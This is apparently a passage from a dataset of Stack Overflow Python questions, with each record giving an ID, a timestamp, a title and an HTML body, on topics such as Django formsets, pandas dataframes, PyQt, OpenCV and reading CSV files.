class ContactForm(forms.ModelForm):
       class Meta:
       model = Contact
       fields = ('__all__')

class AddressForm(forms.ModelForm):
       class Meta:
       model = Address
       fields = ('contact','address_name')

AddressFormSet = modelformset_factory(
    Address,
    AddressForm,)

AddressInlineFormSet = inlineformset_factory(
    Contact,
    Address,
    fields=('address_name',),
    extra=0,
    min_num=1,
    max_num=1,
    can_delete=True)
</code></pre>

<p>My POST conditional in my views.py</p>

<p>Im thinking this is the problem...when Im editing how do line up the form Address form with Address Entry?</p>

<pre><code>        if request.method == 'POST':

        ## On a POST, Retrieve the QueryDict data coming from AJAX POST
        JSON_Datalist = request.POST
        ## Convert the Data to a Dict
        jsonString = json.loads( json.dumps(JSON_Datalist))
        formdata = jsonString['form_data']
        ## Load the cleaned list into a Dict
        formdata_dict = json.loads(formdata)

        if formdata_dict['address_set-0-contact'] is not None:
            contact = get_object_or_404(Contact, pk=formdata_dict['address_set-0-contact'])

        contactformset = ContactForm(data=formdata_dict, instance=contact)

        # Have we been provided with a valid form?
        if contactformset.is_valid():
            # Save the new contact to the database.
            contactformset.save()

            addressformset=AddressInlineFormSet(data=formdata_dict,queryset=contactformset.instance.address_set.all(),instance=contact)

            if addressformset.is_valid():
                addressformset.save(commit=False)
                addressformset.contact=contact
                addressformset.save()
            else:
                print(""Address Form is NOT Valid"")
                print addressformset.errors

            return render(request, 'address_book/address_book.html', contacts_dict)
        else:
            # The supplied form contained errors - just print them to the terminal.
            if not contact_form.is_valid():
                print(""Contact Form errors"")
                print(contact_form)
                print("""")
            if not addressformset.is_valid():
                print(""Address Form errors"")
                print(addressformset)
</code></pre>

<p>Jquery w/AJAX</p>

<pre><code>if(buttonValue == 'UpdateButton') {
        $( 'form' ).submit(function( event ) {
            var $form = ( $(this) ).serializeArray(),
                formdata = { },
                JSONformdata;
            //Prevent Page refresh
            event.preventDefault(); 
            //Build Dictionary
            $.each($form, function(key, value) {
                formdata[value.name] = value.value;
            });
            JSONformdata = JSON.stringify(formdata);
            $.post({
                    url:'/addressbook/',
                    data: { 
                        form_data : JSONformdata,
                        csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val(),
                    },
                success: function(json) {
                    $('form#entry_form').remove();
                    console.log(""success post"")
                }
            })
            .fail(function() {
            console.log(""failure"");
            })
        }) ;
    }
</code></pre>
"
39658574,5617886.0,2016-09-23 10:30:25+00:00,2,How to drop columns which have same values in all rows via pandas or spark dataframe?,"<p>Suppose I've data similar to following:</p>

<pre><code>  index id   name  value  value2  value3  data1  val5
    0  345  name1    1      99      23     3      66
    1   12  name2    1      99      23     2      66
    5    2  name6    1      99      23     7      66
</code></pre>

<p>How can we drop all those columns like (<code>value</code>, <code>value2</code>, <code>value3</code>) where all rows have same values, in one command or couple of commands using <strong>python</strong> ? </p>

<p>Consider we have many columns similar to <code>value</code>,<code>value2</code>,<code>value3</code>...<code>value200</code>.</p>

<p>Output:</p>

<pre><code>   index id      name   data1
        0  345  name1    3
        1   12  name2    2
        5    2  name6    7
</code></pre>
"
40087681,3536147.0,2016-10-17 13:27:02+00:00,2,Mute printing of an imported Python script,"<p>I want to import a python script in to another script. </p>

<pre><code>$ cat py1.py
test=(""hi"", ""hello"")

print test[0]

$ cat py2.py
from py1 import test

print test
</code></pre>

<p>If I execute <code>py2.py</code>:</p>

<pre><code>$ python py2.py 
hi
('hi', 'hello')
</code></pre>

<p>Can I anyway mute the first <code>print</code> which is coming from the <code>from py1 import test</code>?</p>

<p>I can't comment the <code>print</code> in <code>py1</code>, since it is being used somewhere else. </p>
"
40088559,6762999.0,2016-10-17 14:05:20+00:00,2,Python - Check if two words are in a string,"<p>I would like to check whether 2 words ""car"" and ""motorbike"" are in each element of an array in Python. I know how to check for one word with <code>in</code> but have no idea how to do with 2 words. Really appreciate any help</p>
"
40033009,7016499.0,2016-10-14 00:14:11+00:00,2,Making a collage using Jython in JES,"<p>I have a project for school where I have to create a collage that displays an image multiple times with changes to each image.  I had an issue with the filze size of a previous image, but got that resolved and now have another issue.  When running the collage program, it creates a different image for each function to change the image, then it displays a blank canvas with the message ""Picture, filename None height 700 width 515"" in JES.  I need all of the images to display on that one canvas with their changes.  Any help is appreciated</p>

<pre><code>def copy(sourcePic,targetPic, tarX, tarY):
  pictureTurtle = makePicture(getMediaPath(""turtle.jpg""))
  targetX = tarX
  for sourceX in range(0, getWidth(sourcePic)):
    targetY = tarY
    for sourceY in range(0, getHeight(sourcePic)):
      pxColor = getPixel(sourcePic, sourceX, sourceY)
      txColor = getPixel(targetPic, targetX, targetY)
      target = targetY + 1
    targetX = targetX + 1



def lighten(pictureTurtle):
  pictureTurtle = makePicture(getMediaPath(""turtle.jpg""))
  for pxColor in getPixels(pictureTurtle):
    color = getColor(pxColor)
    color = makeLighter(color)
    setColor(pxColor, color)
  show(pictureTurtle)



def negative(pictureTurtle):
  pictureTurtle = makePicture(getMediaPath(""turtle.jpg""))
  for pxColor in getPixels(pictureTurtle):
    red = getRed(pxColor)
    green = getGreen(pxColor)
    blue = getBlue(pxColor)
    negColor = makeColor(255-red,255-green,255-green)
    setColor(pxColor, negColor)
  show(pictureTurtle)



def grayscale(pictureTurtle):
  pictureTurtle = makePicture(getMediaPath(""turtle.jpg""))
  for pxColor in getPixels(pictureTurtle):
    intensity = (getRed(pxColor)+getBlue(pxColor))/3
    setColor(pxColor,makeColor(intensity,intensity,intensity))
  show(pictureTurtle)


def rotate(pictureTurtle):
  pictureTurtle = makePicture(getMediaPath(""turtle.jpg""))
  w,h = getWidth(pictureTurtle), getHeight(pictureTurtle)
  for y in xrange(h):
    for x in xrange(w):
      color = getColor(getPixel(pictureTurtle, x, y))
      targetPixel = getPixel(pictureTurtle, x, y)
      setColor(targetPixel, color)
  show(pictureTurtle)

def collage():
  pictureTurtle = makePicture(getMediaPath(""turtle.jpg""))
  canvas = makeEmptyPicture(515, 700)
  copy(pictureTurtle,canvas,0,getHeight(canvas)-getHeight(pictureTurtle)-5)
  lighten(pictureTurtle)
  copy(pictureTurtle,canvas,50,getHeight(canvas)-getHeight(pictureTurtle)-5)
  negative(pictureTurtle)
  copy(pictureTurtle,canvas,100,getHeight(canvas)-getHeight(pictureTurtle)-5)
  grayscale(pictureTurtle)
  copy(pictureTurtle,canvas,12,75-5)
  rotate(pictureTurtle)
  copy(pictureTurtle, canvas,62, 75-5)
  show(canvas)
  return(canvas)
</code></pre>
"
39738525,3647236.0,2016-09-28 05:12:23+00:00,2,"Python requests, how to add content-type to multipart/form-data request","<p>I Use python requests to upload a file with PUT method.</p>

<p>The remote API Accept any request only if the body contains an attribute 
Content-Type:i mage/png not as Request Header </p>

<p>When i use python requests , the request rejected because missing attribute</p>

<p><a href=""http://i.stack.imgur.com/8KQ0F.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/8KQ0F.png"" alt=""This request is rejected on this image""></a></p>

<p>I tried to use a proxy and after adding the missing attribute , it was accepted</p>

<p>See the highlighted text</p>

<p><a href=""http://i.stack.imgur.com/zzFBn.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/zzFBn.png"" alt=""Valid request""></a> </p>

<p>but i can not programmatically add it , How can i do it?</p>

<p>And this is my code:</p>

<pre><code>files = {'location[logo]': open(fileinput,'rb')} 

ses = requests.session()
res = ses.put(url=u,files=files,headers=myheaders,proxies=proxdic)
</code></pre>
"
39658719,3906713.0,2016-09-23 10:37:56+00:00,2,Conflict between PyQt5 and datetime.datetime.strptime,"<p>So I was writing a tool that would read time from file using graphical user interface based on python 3.52 and Qt5. The minimal operation</p>

<pre><code>datetime.datetime.strptime('Tue', '%a')
</code></pre>

<p>works in an isolated environment, giving output ""1900-01-01 00:00:00"". However, when I run the following minimal example</p>

<pre><code>import sys
import datetime as datetime

from PyQt5 import QtWidgets

if __name__ == '__main__' :
    print(datetime.datetime.strptime('Tue', '%a'))
    app = QtWidgets.QApplication(sys.argv)
    print(datetime.datetime.strptime('Tue', '%a'))
    #sys.exit(app.exec_())
</code></pre>

<p>I get the output</p>

<pre><code>1900-01-01 00:00:00
Traceback (most recent call last):
File ""/home/user/gui/testfile.py"", line 11, in &lt;module&gt;
print(datetime.datetime.strptime('Tue', '%a'))
File ""/usr/lib/python3.5/_strptime.py"", line 510, in _strptime_datetime
tt, fraction = _strptime(data_string, format)
File ""/usr/lib/python3.5/_strptime.py"", line 343, in _strptime
(data_string, format))
ValueError: time data 'Tue' does not match format '%a'
</code></pre>

<p>So, the first call to the <i>strptime</i> routine works fine, but after the <i>QApplication</i> class is created, it does not work any more. Note that further using <i>QApplication</i> to construct the GUI and do a lot of complicated things with it works fine. The only thing that does not work currently is <i>strptime</i></p>

<p>Any idea what goes wrong?</p>
"
40090600,623007.0,2016-10-17 15:44:41+00:00,2,Python type checking not working as expected,"<p>I'm sure I'm missing something obvious here, but why does the following script actually work?</p>

<pre><code>import enum
import typing

class States(enum.Enum):
    a = 1
    b = 2

states = typing.NewType('states', States)

def f(x: states) -&gt; states:
    return x

print(
    f(States.b),
    f(3)
)
</code></pre>

<p>As far I understand it, it should fail on the call <code>f(3)</code>, however it doesn't. Can someone shed some light on this behaviour?</p>
"
39737941,4256703.0,2016-09-28 04:14:50+00:00,2,Efficient way to check if the last element in a row (in a list of lists) is found in another list?,"<p>I currently have a list of lists (let's name it ""big"") that is about 9 columns and 5000 rows and growing. I have another list (let's name this one ""small"") that has approximately 3000 elements. My goal is to return each row in big where big[8] can be found in small. The results will be stored in a list of lists.</p>

<p>I have used list comprehension which has been returning the proper output, but it is far too inefficient for my needs. It takes several seconds to process these 5000 rows (usually about 6.5 seconds, and its efficiency gets worse with larger lists), and it needs to be able to quickly handle hundreds of thousands of rows.</p>

<p>The list comprehension I wrote is:</p>

<pre><code>results = [row for row in big if row[8] in small]
</code></pre>

<p>Sample data of list of lists (big):</p>

<pre><code>[[23.4, 6.8, 9.0, 13.0, 4.0, 19.0, 2.5, 7.6, 1472709600000], 
[32.1, 15.5, 17.7, 21.7, 12.7, 27.7, 11.2, 16.3, 1472882400000], 
[40.8, 24.2, 26.4, 30.4, 21.4, 36.4, 19.9, 25.0, 1473055200000], 
[49.5, 32.9, 35.1, 39.1, 30.1, 45.1, 28.6, 33.7, 1473228000000], 
[58.2, 41.6, 43.8, 47.8, 38.8, 53.8, 37.3, 42.4, 1473400800000]]
</code></pre>

<p>Sample data of list (small):</p>

<pre><code>[1472709600000, 1473055200000]
</code></pre>

<p>Desired output (results):</p>

<pre><code>[[23.4, 6.8, 9.0, 13.0, 4.0, 19.0, 2.5, 7.6, 1472709600000], 
[40.8, 24.2, 26.4, 30.4, 21.4, 36.4, 19.9, 25.0, 1473055200000]]
</code></pre>

<p>Is there a more efficient way to return each row that has its last element found in another list?</p>
"
40035361,6901259.0,2016-10-14 05:12:46+00:00,2,How do I convert float decimal to float octal/binary?,"<p>I have been searched everywhere to find a way to convert float to octal or binary. I know about the <code>float.hex</code> and <code>float.fromhex</code>. Is theres a modules which can do the same work for octal/binary values?</p>

<p>For example: I have a float <code>12.325</code> and I should get float octal <code>14.246</code>. Tell me, how I can do this? Thanks in advance.</p>
"
39656433,5693776.0,2016-09-23 08:42:59+00:00,2,How to download outlook attachment from Python Script?,"<p>I need to download incoming attachment without past attachment from mail using Python Script.</p>

<p>For example:If anyone send mail at this time(now) then just download that attachment only into local drive not past attachments.</p>

<p>Please anyone help me to download attachment using python script or java.</p>
"
39739093,2947950.0,2016-09-28 05:59:26+00:00,2,Fetching data till the end instead of using multiple next(v)[1],"<p>Hi i have a python code that grab data from sample_data.csv before parsing them into out.csv.</p>

<p>Do see the image for better visualisation of sample_data.csv
<a href=""http://i.imgur.com/wwi4RC7.jpg"" rel=""nofollow"">http://i.imgur.com/wwi4RC7.jpg</a></p>

<p>My question is how do i start from the the last next(v)[1] in</p>

<pre><code>datetime = next(v)[1],next(v)[1],next(v)[1],next(v)[1],next(v)[1]
</code></pre>

<p>and begin all the way till the end of the line instead of being silly and using multiple next(v)[1]? This is an issue as different receipt has different amount of line thus i cant have a fix number of next(v)[1] for transaction</p>

<blockquote>
  <p>transaction= next(v)[1], next(v)[1],
  next(v)[1],next(v)[1],next(v)[1],next(v)[1],next(v)[1],next(v)[1]</p>
</blockquote>

<pre><code>import csv
    from itertools import groupby
    from operator import itemgetter
    import re

    with open(""sample_data.csv"", ""rb"") as f, open(""out.csv"", ""wb"") as out:
        reader = csv.reader(f)
        next(reader)
        writer = csv.writer(out)
        writer.writerow([""Receipt ID"",""Name"",""Address"",""Date"",""Time"",""Items"",""Amount"",""Cost"",""Total""])
        groups = groupby(csv.reader(f), key=itemgetter(0))
        for k, v in groups:
            id_, name = next(v)
            add_date_1, add_date_2 = next(v)[1], next(v)[1]
            combinedaddress = add_date_1+ "" "" +add_date_2
            datetime = next(v)[1],next(v)[1],next(v)[1],next(v)[1],next(v)[1]
            abcd = str(datetime)
            dateprinter = re.search('(\d\d/\d\d/\d\d\d\d)\s(\d\d:\d\d)', abcd).group(1)
            timeprinter = re.search('(\d\d/\d\d/\d\d\d\d)\s(\d\d:\d\d)', abcd).group(2)

            transaction= next(v)[1], next(v)[1], next(v)[1],next(v)[1],next(v)[1],next(v)[1],next(v)[1],next(v)[1]
            writer.writerow([id_, name, combinedaddress, dateprinter, timeprinter, transaction])
</code></pre>
"
39736330,856090.0,2016-09-28 00:40:47+00:00,2,`manage.py runserver` and Ctrl+C (Django),"<p>When I quit Django <code>manage.py runserver</code> with Ctrl+C, do threads running HTTP request finish properly or are they interrupted in the middle?</p>
"
40033066,177308.0,2016-10-14 00:21:55+00:00,2,Run a python application/script on startup using Linux,"<p>I've been learning Python for a project required for work.  We are starting up a new server that will be running linux, and need a python script to run that will monitor a folder and handle files when they are placed in the folder.</p>

<p>I have the python ""app"" working, but I'm having a hard time finding how to make this script run when the server is started.  I know it's something simple, but my linux knowledge falls short here.</p>

<p>Secondary question:  As I understand it I don't need to compile or install this application, basically just call the start script to run it.  Is that correct?</p>
"
40086500,5494179.0,2016-10-17 12:33:18+00:00,2,Using external class methods inside the imported module,"<p>My python application consists of various <em>separate</em> processing algorithms/modules combined within a single (Py)Qt GUI for ease of access. </p>

<p>Every processing algorithm sits within its own module and all the communication with GUI elements is implemented within a single class in the main module. 
In particular, this GUI class has a progressbar (<a href=""http://pyqt.sourceforge.net/Docs/PyQt4/qprogressbar.html"" rel=""nofollow"">QProgressBar</a>) object designed to represent the current processing progress of a chosen algorithm.
This object has <code>.setValue()</code> method (<code>self.dlg.progressBar.setValue(int)</code>).</p>

<p>The problem is that since <code>self.dlg.progressBar.setValue()</code> is a class method I cannot use it inside my imported processing modules <em>to report their progress state within their own code</em>. </p>

<p>The only workaround I found is to add <code>progressbar</code> variable to definition of each processing module, pass there <code>self.dlg.progressBar</code> inside the main module and then blindly call <code>progressbar.setValue(%some_processing_var%)</code> inside the processing module. </p>

<p>Is this the only way to use outer class methods inside imported modules or are there better ways? </p>
"
39737767,6760078.0,2016-09-28 03:54:31+00:00,2,String Output in Python,"<pre><code> html_body += ""&lt;tr&gt;&lt;td&gt;{}&lt;/td&gt;&lt;td&gt;{}&lt;/td&gt;&lt;td&gt;{}&lt;/td&gt;&lt;td&gt;{}&lt;/td&gt;"".\format(p[0],p[1],p[2],p[3])
                                                                                           ^
</code></pre>

<blockquote>
  <p>SyntaxError: unexpected character after line continuation character</p>
</blockquote>

<p>It looks normal. how should i fix it?</p>
"
39734836,5855283.0,2016-09-27 21:46:38+00:00,2,Join Python dataframe time series efficiently,"<p>I have the following  2 dataframes with:</p>

<pre><code>day
        date     val
11740 2016-01-04  1.3970
11741 2016-01-05  1.3991
11742 2016-01-06  1.4084
11743 2016-01-07  1.4061
</code></pre>

<p>and</p>

<pre><code>df
        Adj_Close         Close        Date          High           Low
182  12927.200195  12927.200195  2016-01-04  12928.900391      12748.50   
181  12920.099609  12920.099609  2016-01-05  12954.900391  12839.799805   
180  12726.799805  12726.799805  2016-01-06  12854.599609  12701.700195   
179  12448.200195  12448.200195  2016-01-07  12661.200195  12439.099609 
</code></pre>

<p>I have a cheesy loop to aligh the date to create a new dataframe (new_df) by 'joining' the common date. </p>

<pre><code>new_df = pd.DataFrame(columns=['date', 'close', 'fx', 'usd'])

for indexFx, rowFx in day.iterrows():
    for indexSt, rowSt in df.iterrows(): #this is not efficient 
        fxDate = str(rowFx.date)[:10] #only keep data component not time
        if str(rowSt['Date']) == fxDate:

            dateObj = datetime.strptime(rowSt.Date,'%Y-%m-%d')
            row = [dateObj, rowSt.Close,rowFx.val, float(rowSt.Close) * float(rowFx.val)]
            new_df.loc[len(new_df)] = row
</code></pre>

<p>I know there is an efficient way to Pythonize this loop. Can someone help? </p>

<p>Thanks </p>
"
39694192,828602.0,2016-09-26 03:15:04+00:00,2,Convert string column to integer,"<p>I have a dataframe like below</p>

<pre><code>    a   b
0   1   26190
1   5   python
2   5   580
</code></pre>

<p>I want to make column <code>b</code> to host only integers, but as you can see <code>python</code> is not int convertible, so I want to delete the row at index <code>1</code>. My expected out put has to be like</p>

<pre><code>    a   b
0   1   26190
1   5   580
</code></pre>

<p>How to filter and remove using pandas in python?</p>
"
39742624,4521788.0,2016-09-28 08:59:34+00:00,2,"Database migration from Sybase to MySQL: "" error calling Python module function DbSQLAnywhereRE.reverseEngineer""","<p>I'm trying to migrate a database from <a href=""https://en.wikipedia.org/wiki/Sybase"" rel=""nofollow"">Sybase</a> to <a href=""http://en.wikipedia.org/wiki/MySQL"" rel=""nofollow"">MySQL</a> with the <a href=""https://en.wikipedia.org/wiki/MySQL_Workbench"" rel=""nofollow"">MySQL Workbench</a> migration tool.</p>

<p>I have no problem connecting the datasource and the target database, but when it starts migrating I get the following issue from the log message.</p>

<blockquote>
  <p>Starting...<br>
  Connect to source DBMS...<br>
  - Connecting...<br>
  Connect to source DBMS done<br>
  Reverse engineer selected schemas....<br>
  Reverse engineering DBA, SYS, dbo, rs_systabgroup from corsi<br>
  - Reverse engineering catalog information<br>
  - Preparing...<br>
  Traceback (most recent call last):<br>
    File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 <br>CE\modules\db_sqlanywhere_re_grt.py"", line 489, in reverseEngineer<br>
      return SQLAnywhereReverseEngineering.reverseEngineer(connection, catalog_name, schemata_list, context)<br>
    File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 CE\modules\db_sqlanywhere_re_grt.py"", line 169, in reverseEngineer
      catalog = super(SQLAnywhereReverseEngineering, cls).reverseEngineer(connection, '', schemata_list, context)<br>
    File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 CE\modules\db_generic_re_grt.py"", line 258, in reverseEngineer
      table_count_per_schema[schema_name] = len(cls.getTableNames(connection, catalog_name, schema_name)) if get_tables else 0<br>
    File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 CE\modules\db_sqlanywhere_re_grt.py"", line 41, in wrapped_method
      res = method(cls, connection, *args)<br>
    File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 CE\modules\db_sqlanywhere_re_grt.py"", line 145, in getTableNames
      return [row[0] for row in cls.execute_query(connection, query)]<br>
    File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 CE\modules\db_generic_re_grt.py"", line 76, in execute_query
      return cls.get_connection(connection_object).cursor().execute(query, *args, **kwargs)
  pyodbc.ProgrammingError: ('42S02', ""[42S02] [Sybase][ODBC Driver][Adaptive Server Anywhere]Table or view not found: Table 'SYSTAB' not found (-141) (SQLExecDirectW)"")<br></p>
  
  <p>Traceback (most recent call last):<br>   File ""C:\Program Files
  (x86)\MySQL\MySQL Workbench 6.3
  CE\workbench\wizard_progress_page_widget.py"", line 192, in thread_work
      self.func()<br>   File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3 CE\modules\migration_schema_selection.py"", line 175, in
  task_reveng
      self.main.plan.migrationSource.reverseEngineer()<br>   File ""C:\Program Files (x86)\MySQL\MySQL Workbench 6.3
  CE\modules\migration.py"", line 369, in reverseEngineer
      self.state.sourceCatalog = self._rev_eng_module.reverseEngineer(self.connection,
  self.selectedCatalogName, self.selectedSchemataNames,
  self.state.applicationData) SystemError: ProgrammingError(""('42S02',
  ""[42S02] [Sybase][ODBC Driver][Adaptive Server Anywhere]Table or view
  not found: Table 'SYSTAB' not found (-141) (SQLExecDirectW)"")""): error
  calling Python module function DbSQLAnywhereRE.reverseEngineer<br>
  ERROR: Reverse engineer selected schemas: ProgrammingError(""('42S02',
  ""[42S02] [Sybase][ODBC Driver][Adaptive Server Anywhere]Table or view
  not found: Table 'SYSTAB' not found (-141) (SQLExecDirectW)"")""): error
  calling Python module function DbSQLAnywhereRE.reverseEngineer<br>
  Failed</p>
</blockquote>

<p>How do I solve this issue?</p>
"
39739697,225262.0,2016-09-28 06:35:27+00:00,2,What does it mean when the cumtimes of callees don't add up to the total cumtime of a function?,"<p>I'm using <code>cProfile.Profile</code>.</p>

<p>In the output of <code>print_callees</code>, I can see that a function takes about 2 seconds of <code>cumtime</code>.</p>

<p>But when I check the output of the functions it calls, their <code>cumtime</code> don't sum up to that of the caller. Actually it's much smaller.</p>

<p>What could be the reason of this?</p>
"
40024666,2352319.0,2016-10-13 15:05:53+00:00,2,Pandas distinct count as a DataFrame,"<p>Suppose I have a Pandas DataFrame called <code>df</code> with columns <code>a</code> and <code>b</code> and what I want is the number of distinct values of <code>b</code> per each <code>a</code>. I would do:</p>

<pre><code>distcounts = df.groupby('a')['b'].nunique()
</code></pre>

<p>which gives the desidered result, but it is as Series object rather than another DataFrame. I'd like a DataFrame instead. In regular SQL, I'd do:</p>

<pre><code>SELECT a, COUNT(DISTINCT(b)) FROM df
</code></pre>

<p>and haven't been able to emulate this query in Pandas exactly. How to?</p>
"
40024017,221708.0,2016-10-13 14:36:46+00:00,2,How does Django's `url` template tag reverse a Regex?,"<p>How does Django's <code>url</code> template tag work?  What magic does it use under the covers to ""reverse"" a regex?</p>

<p>You give it a regex like this:</p>

<pre><code>urlpatterns = [
    # ex: /polls/5/
    url(r'^(?P&lt;question_id&gt;[0-9]+)/$', views.detail, name='detail'),
]
</code></pre>

<p>... and then in your template you can generate a URL that matches that pattern like this:</p>

<pre><code>&lt;a href=""{% url 'detail' question.id %}""&gt;{{ question.question_text }}&lt;/a&gt;
</code></pre>

<p>How does that work?  Normally a regex is used to <strong>parse</strong> text, not <strong>generate</strong> it. Are there built-in tools in the <code>re</code> module that provide this functionality?</p>

<p>My question is not about how to use Django, or how to parse text with a Regex. Instead I'm interested in learning how I can use regular expressions in this ""string template"" way elsewhere.</p>
"
40096826,6866272.0,2016-10-17 22:45:24+00:00,2,Ranking python dictionary by percentile,"<p>If i have a dictionary that records the count frequency of random objects:</p>

<pre><code>dict = {'oranges': 4 , 'apple': 3 , 'banana': 3 , 'pear' :1, 'strawberry' : 1....}
</code></pre>

<p>And I want only the keys that are in the top 25th percentile by frequency, how would i do that ? Especially if it's a very long tail list and a lot of records will have the same count. </p>
"
39752235,3601754.0,2016-09-28 15:51:07+00:00,2,Python How to detect vertical and horizontal lines in an image with HoughLines with OpenCV?,"<p>I m trying to obtain a threshold of the calibration chessboard. I cant detect directly the chessboard corners as there is some dust as i observe a micro chessboard.
I try several methods and HoughLinesP seems to be the easiest approach. But the results are not good, how to improve my results?</p>

<pre><code>import numpy as np
import cv2

img = cv2.imread('lines.jpg')
gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)
edges = cv2.Canny(gray,50,150,apertureSize = 3)
print img.shape[1]
print img.shape
minLineLength=100
lines = cv2.HoughLinesP(image=edges,rho=0.02,theta=np.pi/500, threshold=10,lines=np.array([]), minLineLength=minLineLength,maxLineGap=100)

a,b,c = lines.shape
for i in range(a):
    cv2.line(img, (lines[i][0][0], lines[i][0][1]), (lines[i][0][2], lines[i][0][3]), (0, 0, 255), 3, cv2.LINE_AA)
    cv2.imwrite('houghlines5.jpg',img)
</code></pre>

<p>As you can see on figure below, i cant obtain my chessboard, the lines are plotted in a lot of directions... (the original picture : <a href=""https://s22.postimg.org/iq2b91xq9/droite_Image_00000.jpg"" rel=""nofollow"">https://s22.postimg.org/iq2b91xq9/droite_Image_00000.jpg</a>)</p>

<p><a href=""http://i.stack.imgur.com/Qmksl.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/Qmksl.jpg"" alt=""enter image description here""></a></p>
"
39645804,6866174.0,2016-09-22 17:55:39+00:00,2,Open a csv.gz file in Python and print first 100 rows,"<p>I'm trying to get only the first 100 rows of a csv.gz file that has over 4 million rows in Python. I also want information on the # of columns and the headers of each. How can I do this? </p>

<p>I looked at <a href=""http://stackoverflow.com/questions/10566558/python-read-lines-from-compressed-text-files"">python: read lines from compressed text files</a> to figure out how to open the file but I'm struggling to figure out how to actually print the first 100 rows and get some metadata on the information in the columns. </p>

<p>I found this <a href=""https://stackoverflow.com/questions/1767513/read-first-n-lines-of-a-file-in-python"">Read first N lines of a file in python</a> but not sure how to marry this to opening the csv.gz file and reading it without saving an uncompressed csv file. </p>

<p>I have written this code:</p>

<pre><code>import gzip
import csv
import json
import pandas as pd


df = pd.read_csv('google-us-data.csv.gz', compression='gzip', header=0,    sep=' ', quotechar='""', error_bad_lines=False)
for i in range (100):
print df.next() 
</code></pre>

<p>I'm new to Python and I don't understand the results. I'm sure my code is wrong and I've been trying to debug it but I don't know which documentation to look at. </p>

<p>I get these results (and it keeps going down the console - this is an excerpt): </p>

<pre><code>Skipping line 63: expected 3 fields, saw 7
Skipping line 64: expected 3 fields, saw 7
Skipping line 65: expected 3 fields, saw 7
Skipping line 66: expected 3 fields, saw 7
Skipping line 67: expected 3 fields, saw 7
Skipping line 68: expected 3 fields, saw 7
Skipping line 69: expected 3 fields, saw 7
Skipping line 70: expected 3 fields, saw 7
Skipping line 71: expected 3 fields, saw 7
Skipping line 72: expected 3 fields, saw 7
</code></pre>
"
40024294,6695547.0,2016-10-13 14:48:10+00:00,2,Pandas data frame combine rows,"<p>My problem is a large data frame which I would like to clear out. The two main problems for me are: </p>

<ol>
<li><p>The whole data frame is time-based. That means I can not shift rows around, otherwise, the timestamp wouldn't fit anymore.</p></li>
<li><p>The data is not always in the same order.</p></li>
</ol>

<p>Here is an example to clarify</p>

<pre><code>index  a  b  c  d  x1  x2  y1  y2  t
0                  1   2           0.2
1      1  2                        0.4
2                          2   4   0.6
3                  1   2           1.8
4                          2   3   2.0
5                  1   2           3.8
6                          2   3   4.0
7            2  5                  4.2
</code></pre>

<p>The result should be looking like this</p>

<pre><code>index  a  b  c  d  x1  x2  y1  y2  t
0                  1   2   2   4   0.2
1      1  2                        0.4
3                  1   2   2   3   1.8
5                  1   2   2   3   3.8
7            2  5                  4.2
</code></pre>

<p>This means I would like, to sum up, the right half of the df and keep the timestamp of the first entry. The second problem is, there might be different data from the left half of the df in between. </p>
"
39751945,6764079.0,2016-09-28 15:35:36+00:00,2,what is most pythonic way to find a element in a list that is different with other elements?,"<p>Suppose we have a list with unknown size and there is an element in the list that is different with other elements but we don't know the index of the element. the list only contains numerics and is fetched from a remote server and the length of the list and the index of the different element is changed every time. what is the most pythonic way to find that different element?
I tried this but I'm not sure if it's the best solution.</p>

<pre><code>a = 1
different_element = None
my_list = fetch_list()

b = my_list[0] - a

for elem in my_list[1::]:
    if elem - a != b:
        different_element = elem

print(different_element)
</code></pre>
"
40024406,6495072.0,2016-10-13 14:53:12+00:00,2,Keeping columns in the specified order when using UseCols in Pandas Read_CSV,"<p>I have a csv file with 50 columns of data. I am using Pandas read_csv function to pull in a subset of these columns, using  the usecols parameter to choose the ones I want:</p>

<pre><code>cols_to_use = [0,1,5,16,8]
df_ret = pd.read_csv(filepath, index_col=False, usecols=cols_to_use)
</code></pre>

<p>The trouble is df_ret contains the correct columns, but not in the order I specified. They are in ascending order, so [0,1,5,8,16]. (By the way the column numbers can change from run to run, this is just an example.) This is a problem because the rest of the code has arrays which are in the ""correct"" order and I would rather not have to reorder all of them. </p>

<p>Is there any clever pandas way of pulling in the columns in the order specified? Any help would be much appreciated!</p>
"
39751866,1909918.0,2016-09-28 15:32:06+00:00,2,expanding rows in pandas dataframe,"<p>I have the following data:</p>

<pre><code>product Sales_band  Hour_id sales
prod_1  HIGH           1    200
prod_1  HIGH           3    100
prod_1  HIGH           4    300
prod_1  VERY HIGH      2    100
prod_1  VERY HIGH      5    253
prod_1  VERY HIGH      6    234
</code></pre>

<p>want to add rows based on the <strong>hour_id</strong> value. hour_id variable can take values from <strong>1 to 10</strong>. So the same data above will be expanded where the hour ids are missing. Dummy output is :(<strong>sales = 0 when missing hour id</strong>)</p>

<pre><code>product Sales_band  Hour_id sales
prod_1  HIGH           1    200
prod_1  HIGH           2    0
prod_1  HIGH           3    100
prod_1  HIGH           4    300
prod_1  HIGH           5    0
prod_1  HIGH           6    0
prod_1  HIGH           7    0
prod_1  HIGH           8    0
prod_1  HIGH           9    0
prod_1  HIGH           10   0
prod_1  VERY HIGH      1    0
prod_1  VERY HIGH      2    100
prod_1  VERY HIGH      3    0
prod_1  VERY HIGH      4    0
prod_1  VERY HIGH      5    253
prod_1  VERY HIGH      6    234
prod_1  VERY HIGH      7    0
prod_1  VERY HIGH      8    0
prod_1  VERY HIGH      9    0
prod_1  VERY HIGH      10   0
</code></pre>

<p>how can I achieve this using python dataframe.</p>
"
40096612,7033461.0,2016-10-17 22:22:16+00:00,2,How do I open a text file in Python?,"<p>Currently I am trying to open a text file called ""temperature.txt"" i have saved on my desktop using file handler, however for some reason i cannot get it to work. Could anyone tell me what im doing wrong.</p>

<pre><code>#!/Python34/python
from math import *

fh = open('temperature.txt')

num_list = []

for num in  fh:
    num_list.append(int(num))

fh.close()
</code></pre>
"
